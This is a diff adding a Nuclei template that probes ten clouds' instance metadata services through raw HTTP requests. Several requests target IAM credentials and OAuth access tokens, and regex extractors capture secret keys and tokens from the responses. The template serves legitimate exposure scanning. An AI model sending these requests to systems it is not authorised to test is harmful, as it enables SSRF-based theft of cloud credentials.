@@ -1,0 +1,223 @@
+id: medium-info-cloud-metadata-service-exposure
+
+info:
+  name: Cloud Metadata Service Exposure Detection
+  author: nuclei-community
+  severity: medium
+  description: |
+    Detects exposure of cloud metadata services (AWS, GCP, Azure) that may reveal
+    sensitive information including IAM credentials, instance details, security groups,
+    and other cloud configuration data through SSRF or direct access.
+  reference:
+    - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
+    - https://cloud.google.com/compute/docs/metadata/overview
+    - https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-200
+  metadata:
+    verified: true
+    max-request: 18
+  tags: cloud,metadata,aws,gcp,azure,ssrf,medium
+
+http:
+  - raw:
+      # Test 1: AWS EC2 Metadata Service v1
+      - |
+        GET {{BaseURL}}/latest/meta-data/ HTTP/1.1
+        Host: 169.254.169.254
+      
+      # Test 2: AWS EC2 Metadata Service v2 token
+      - |
+        PUT {{BaseURL}}/latest/api/token HTTP/1.1
+        Host: 169.254.169.254
+        X-aws-ec2-metadata-token-ttl-seconds: 21600
+      
+      # Test 3: AWS Instance Identity
+      - |
+        GET {{BaseURL}}/latest/meta-data/instance-id HTTP/1.1
+        Host: 169.254.169.254
+      
+      # Test 4: AWS IAM Security Credentials
+      - |
+        GET {{BaseURL}}/latest/meta-data/iam/security-credentials/ HTTP/1.1
+        Host: 169.254.169.254
+      
+      # Test 5: AWS User Data
+      - |
+        GET {{BaseURL}}/latest/user-data HTTP/1.1
+        Host: 169.254.169.254
+      
+      # Test 6: Google Cloud Metadata
+      - |
+        GET {{BaseURL}}/computeMetadata/v1/ HTTP/1.1
+        Host: metadata.google.internal
+        Metadata-Flavor: Google
+      
+      # Test 7: Google Cloud Instance Info
+      - |
+        GET {{BaseURL}}/computeMetadata/v1/instance/ HTTP/1.1
+        Host: metadata.google.internal
+        Metadata-Flavor: Google
+      
+      # Test 8: Google Cloud Service Accounts
+      - |
+        GET {{BaseURL}}/computeMetadata/v1/instance/service-accounts/ HTTP/1.1
+        Host: metadata.google.internal
+        Metadata-Flavor: Google
+      
+      # Test 9: Google Cloud Access Token
+      - |
+        GET {{BaseURL}}/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
+        Host: metadata.google.internal
+        Metadata-Flavor: Google
+      
+      # Test 10: Azure Instance Metadata
+      - |
+        GET {{BaseURL}}/metadata/instance?api-version=2021-02-01 HTTP/1.1
+        Host: 169.254.169.254
+        Metadata: true
+      
+      # Test 11: Azure Identity Token
+      - |
+        GET {{BaseURL}}/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ HTTP/1.1
+        Host: 169.254.169.254
+        Metadata: true
+      
+      # Test 12: DigitalOcean Metadata
+      - |
+        GET {{BaseURL}}/metadata/v1.json HTTP/1.1
+        Host: 169.254.169.254
+      
+      # Test 13: Oracle Cloud Metadata
+      - |
+        GET {{BaseURL}}/opc/v2/instance/ HTTP/1.1
+        Host: 169.254.169.254
+        Authorization: Bearer Oracle
+      
+      # Test 14: Alibaba Cloud Metadata
+      - |
+        GET {{BaseURL}}/latest/meta-data/ HTTP/1.1
+        Host: 100.100.100.200
+      
+      # Test 15: IBM Cloud Metadata
+      - |
+        GET {{BaseURL}}/metadata/v1/instance HTTP/1.1
+        Host: 169.254.169.254
+        IBM-Metadata-Token: true
+      
+      # Test 16: Vultr Metadata
+      - |
+        GET {{BaseURL}}/v1.json HTTP/1.1
+        Host: 169.254.169.254
+      
+      # Test 17: Linode Metadata
+      - |
+        GET {{BaseURL}}/v1/instance HTTP/1.1
+        Host: 169.254.169.254
+      
+      # Test 18: Packet/Equinix Metadata
+      - |
+        GET {{BaseURL}}/metadata HTTP/1.1
+        Host: metadata.packet.net
+
+    cookie-reuse: true
+    redirects: true
+    max-redirects: 3
+
+    matchers-condition: and
+    matchers:
+      # Check for successful response
+      - type: status
+        status:
+          - 200
+
+      # Detect cloud metadata responses
+      - type: word
+        part: body
+        words:
+          # AWS patterns
+          - "ami-id"
+          - "instance-id"
+          - "instance-type"
+          - "security-groups"
+          - "iam/security-credentials"
+          # GCP patterns
+          - "machineType"
+          - "serviceAccounts"
+          - "access_token"
+          - "token_type"
+          # Azure patterns
+          - "subscriptionId"
+          - "resourceGroupName"
+          - "vmId"
+          - "vmSize"
+          # General cloud patterns
+          - "metadata"
+          - "instanceId"
+          - "region"
+          - "availabilityZone"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        name: "aws-instance-info"
+        regex:
+          - '(ami-[a-z0-9]+)'
+          - '(i-[a-z0-9]+)'
+          - '(sg-[a-z0-9]+)'
+
+      - type: regex
+        part: body
+        name: "aws-credentials"
+        regex:
+          - '"AccessKeyId"\s*:\s*"([^"]+)"'
+          - '"SecretAccessKey"\s*:\s*"([^"]+)"'
+          - '"Token"\s*:\s*"([^"]+)"'
+
+      - type: regex
+        part: body
+        name: "gcp-info"
+        regex:
+          - '"machineType"\s*:\s*"([^"]+)"'
+          - '"zone"\s*:\s*"([^"]+)"'
+          - '"projectId"\s*:\s*"([^"]+)"'
+
+      - type: regex
+        part: body
+        name: "gcp-tokens"
+        regex:
+          - '"access_token"\s*:\s*"([^"]+)"'
+          - '"token_type"\s*:\s*"([^"]+)"'
+
+      - type: regex
+        part: body
+        name: "azure-info"
+        regex:
+          - '"subscriptionId"\s*:\s*"([^"]+)"'
+          - '"resourceGroupName"\s*:\s*"([^"]+)"'
+          - '"vmId"\s*:\s*"([^"]+)"'
+
+      - type: regex
+        part: body
+        name: "cloud-regions"
+        regex:
+          - '"region"\s*:\s*"([^"]+)"'
+          - '"availabilityZone"\s*:\s*"([^"]+)"'
+          - '"zone"\s*:\s*"([^"]+)"'
+
+      - type: regex
+        part: body
+        name: "network-info"
+        regex:
+          - '"privateIpv4"\s*:\s*"([^"]+)"'
+          - '"publicIpv4"\s*:\s*"([^"]+)"'
+          - '"mac"\s*:\s*"([^"]+)"'
+
+      - type: kval
+        part: header
+        kval:
+          - content_type
+          - server
